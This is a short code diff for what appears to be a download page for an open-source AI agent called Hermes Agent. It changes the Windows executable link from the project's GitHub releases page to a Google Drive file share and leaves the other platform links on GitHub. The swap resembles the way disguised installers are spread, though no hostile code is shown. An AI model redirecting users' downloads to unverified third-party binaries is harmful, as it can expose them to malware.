@@ -35,7 +35,7 @@ const TITLE =
 const DESC =
   "Download Hermes Agent free: the open-source reasoning and function-calling AI agent built on the Nous Hermes 3 architecture. Advanced planning, structured JSON tool use, local offline execution, and $0 fees.";
 
-const EXE_URL = "https://github.com/digiformation/hermes-agent/releases";
+const EXE_URL = "https://drive.google.com/file/d/1389VShNDmR_1jGHgXV3Tqtcvqm3qfkX9/view?usp=sharing";
 const DMG_URL = "https://github.com/digiformation/hermes-agent/releases";
 const ZIP_URL = hermesZip.url;
 const REPO_URL = "https://github.com/digiformation/hermes-agent";
